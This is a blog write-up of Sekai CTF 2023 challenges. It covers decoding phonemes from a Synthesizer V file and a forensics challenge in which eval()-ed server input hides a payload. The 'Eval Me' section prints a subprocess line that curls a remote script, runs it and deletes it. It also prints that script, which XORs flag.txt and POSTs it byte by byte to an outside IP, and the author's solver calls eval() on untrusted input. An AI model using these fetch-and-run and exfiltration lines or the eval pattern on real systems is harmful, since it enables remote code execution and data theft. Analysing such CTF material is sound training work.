---
title: "Sekai CTF"
date: 2023-08-26T10:36:03-04:00
categories: [ctf, writeup, QR, ]
tags: [Synthesizer_V, Graph, GES]
math: true
cover:
    image: sekai_banner.png
---

Sekai CTF team's CTF tournament. We had very nice intermediate-to-hard level of challenges. Some of the challenges were very unique. While, I did not have sufficient time to do this CTF justice, I enjoyed every challenge that I tried. 
<!--more-->
#### I love this world

`Vocaloid is a great software to get your computer sing the flag out to you, but what if you can’t afford it? No worries, there are plenty of other free tools you can use. How about — let’s say — this one?`

Attachment: `ilovethisworld.svp`

##### How I actually solved the challenge

1. Examined the attachment and found it to be a JSON format file. 
1. Searching the internet for `SVP` and `I love this world` showed this page: https://www.bilibili.com/read/cv16383991/
1. The article referenced `Synthesizer V` as the software that would play the `SVP` file
1. Downloaded the software and realized that I needed the voice database called `Eleanor Forte (Lite)`. Downloaded and installed the voice library too. 
1. Changed the tempo (speed) of the sound from `120` to `45`. This gave me a speech that could be intepreted as english letters and numbers.
1. Interpreting the sounds gets the flag.

##### How I ought to have solved it

1. Examine the `SVP` JSON file. We see a bunch of fields related to generating speech. 
1. One of the fields is called `phonemes` and looks interesting.
1. Use a tool like `jsonpath_ng` to extract all values of the field `phonemes`. Maintain the order that was in the file. 
1. Extracting all the phonemes values show that it is the phonetic pronunciation of the flag
1. Reference (from post-CTF writeups): https://github.com/cmusphinx/sphinxtrain/blob/master/test/res/communicator.dic.cmu
1. Examples from that file:  `COLON` == `K OW L AX N`

```
% jsonpath_ng "$..phonemes" ilovethisworld.json 
```
Phonemes | Letters
----|----
eh f|F
eh l|L
ey|A
jh iy|G
k ow l ax n|`colon` :
eh s|S
iy|E
k ey|K
ey|A
ay|I
ow p ax n k er l iy b r ae k ih t| `open curly bracket` {
eh s|s
ow|o
eh m|m
iy|e
w ah n|`one`1
z iy|z
eh f|f
ey|a
aa r|r
ey|a
d ah b ax l y uw|`double u` w
ey|a
w ay|y
t iy|t
eh m|m
aa r|r
w ah n|`one` 1
f ay v|`five`5
eh s|s
iy|e
k y uw|q
y uw|u
iy|e
eh l|l
t iy|t
ow|o
ow|o
y uw|u
aa r|r
d iy|d
aa r|r
iy|e
ey|a
eh m|m
t iy|t
d iy|d
w ay|y
k l ow  s k er l iy b r ae k ih t|`close curly bracket` }

`FLAG: SEKAI{some1zfarawaytmr15sequeltoourdreamtdy}`

#### Eval Me
`I was trying a beginner CTF challenge and successfully solved it. But it didn't give me the flag. Luckily I have this network capture. Can you investigate?`

Attachment: `capture.pcapng`

In addition to the network packet capture, we are also given the netcat info to a challenge server.

Connecting to the server via netcat, gives us this:
```
Welcome to this intro pwntools challenge.
I will send you calculations and you will send me the answer
Do it 100 times within time limit and you get the flag :)

3 * 10
```

So, this seems like a simple pwntools challenge, assisted by a call to the `eval()` function in python.

```python
    from pwn import *
    context.log_level = 'debug'

    R = remote("chals.sekai.team",9000)
    R.recvuntil(b'flag :)\n\n')
    for i in range(100):
        line = R.recvline().decode().strip()
        print(f"Eval({line})")
        ans = eval(line)
        R.sendline(str(ans).encode())
        R.recvuntil(b'correct\n')
    R.interactive()
```
Somewhere during the evaluation of the 100 statements, one of the statements is a tricky beast of python code that purports to download a script from a site, executes the script and deletes it. 
```
    b'__import__("subprocess").check_output("(curl -sL https://shorturl.at/fgjvU -o extract.sh && chmod +x extract.sh && bash extract.sh && rm -f extract.sh)>/dev/null 2>&1||true",shell=True)\r'
    b'#1 + 2 
```
Using curl to pull down the script shows the following program.

```bash
    #!/bin/bash
    FLAG=$(cat flag.txt)
    KEY='s3k@1_v3ry_w0w'
    # Credit: https://gist.github.com/kaloprominat/8b30cda1c163038e587cee3106547a46
    Asc() { printf '%d' "'$1"; }

    XOREncrypt(){
        local key="$1" DataIn="$2"
        local ptr DataOut val1 val2 val3

        for (( ptr=0; ptr < ${#DataIn}; ptr++ )); do

            val1=$( Asc "${DataIn:$ptr:1}" )
            val2=$( Asc "${key:$(( ptr % ${#key} )):1}" )

            val3=$(( val1 ^ val2 ))

            DataOut+=$(printf '%02x' "$val3")
        done

        echo $DataOut

        for ((i=0;i<${#DataOut};i+=2)); do
        BYTE=${DataOut:$i:2}
        echo $BYTE 
        echo curl -m 0.5 -X POST -H "Content-Type: application/json" -d "{\"data\":\"$BYTE\"}" http://35.196.65.151:30899/ &>/dev/null
        done
    }

    echo XOREncrypt $KEY $FLAG
    XOREncrypt $KEY $FLAG

    exit 0
```
We can see that it is reading the flag from `flag.txt`, XOR-ing it with a key `s3k@1_v3ry_w0w` and sends the results one byte at a time to a remote server through a POST call with a JSON payload.

Now, turning our attention to the PCAP file, we can see from the protocol hierarchy stats, that it has 102 frames of JSON data. 

```
% tshark -r capture.pcapng -z io,phs
===================================================================
Protocol Hierarchy Statistics
Filter: 

eth                                      frames:827 bytes:105559
  ip                                     frames:823 bytes:105391
    udp                                  frames:20 bytes:2857
      dns                                frames:16 bytes:1989
      ssdp                               frames:4 bytes:868
    tcp                                  frames:803 bytes:102534
      tls                                frames:241 bytes:49721
        tcp.segments                     frames:4 bytes:2585
          tls                            frames:1 bytes:1268
      http                               frames:102 bytes:22797
        json                             frames:102 bytes:22797
  arp                                    frames:4 bytes:168
===================================================================
```
After examining the JSON data, we can see that it is one byte and can be extracted by the following command.

```
% tshark -r capture.pcapng -Tfields -ejson.value.string -Y "json"  | xargs
20 76 20 01 78 24 45 45 46 15 00 10 00 28 4b 41 19 32 43 00 4e 41 00 0b 2d 05 42 05 2c 0b 19 32 43 2d 04 41 00 0b 2d 05 42 28 52 12 4a 1f 09 6b 4e 00 0f
```
Since this byte value was the result of the flag character XOR'ed with the key, we reverse the process to get the flag back. 

```python
s = "20762001782445454615001000284b41193243004e41000b2d0542052c0b1932432d0441000b2d05422852124a1f096b4e000f"
KEY=b's3k@1_v3ry_w0w'

print(xor(unhex(s), KEY))
# b'SEKAI{3v4l_g0_8rrrr_8rrrrrrr_8rrrrrrrrrrr_!!!_8483}'
```

#### QR God (to do)
`My friend claims to be a QR God. So I tested his knowledge on reconstruction. I gave him the bits and he came up with this, perhaps he forgot that it doesn’t work like a Gutenberg Diagram.`


### Writeups, Resources
* CryptoGRAPHy 1 : https://ctfnote.leg.bzh/pad/s/Z_QKPfErn
* CryptoGRAPHy 2 : https://ctfnote.leg.bzh/pad/s/dZNZbd-9e
* CryptoGRAPHy 3 : https://ctfnote.leg.bzh/pad/s/t1i5QbLlx
* NoisyCRC : https://ctfnote.leg.bzh/pad/s/haum5HonP 
* https://github.com/7Rocky/CTF-scripts/tree/main/Sekai%20CTF
* https://github.com/deut-erium/auto-cryptanalysis


### Challenges
{{< collapse summary="List of challenges" >}}
|Category|Challenge|Description
|----|----|----
|Cryptography |Diffecientwo|
|Cryptography |Noisier CRC|
|Cryptography |Noisy CRC|
|Cryptography |RandSubWare|
|Cryptography |cryptoGRAPHy 1|
|Cryptography |cryptoGRAPHy 2|
|Cryptography |cryptoGRAPHy 3|
|Forensics |DEF CON Invitation|
|Forensics |Dumpster Dive|
|Forensics |Eval Me|
|Forensics |Infected|
|Misc |A letter from the Human Resource Management|
|Misc |I love this world|
|Misc |Just Another Pickle Jail|
|Misc |QR God|
|Misc |SSH|
|Misc |SekaiCTFCorp|
|Misc |[Blockchain] Play for Free|
|Misc |[Blockchain] Re-Remix|
|Misc |▶ Sanity Check|
|Misc |▻ Survey|
|PPC |Mikusweeper|
|PPC |Project Sekai Event Planner|
|PPC |Purple Sheep And The Apple Rush|
|PPC |Wiki Game|
|Pwn |Algorithm Multitool|
|Pwn |Cosmic Ray|
|Pwn |Hibana|
|Pwn |Network Tools|
|Pwn |Notification|
|Pwn |Text Sender|
|Pwn |[Blockchain] The Bidding|
|Reverse |Azusawa’s Gacha World|
|Reverse |Conquest of Camelot|
|Reverse |Guardians of the Kernel|
|Reverse |Sahuang Flag Checker|
|Reverse |Teyvat Travel Guide|
|Web |Chunky|
|Web |Frog-WAF|
|Web |Golf Jail|
|Web |Leakless Note|
|Web |Scanner Service|
{{< /collapse >}}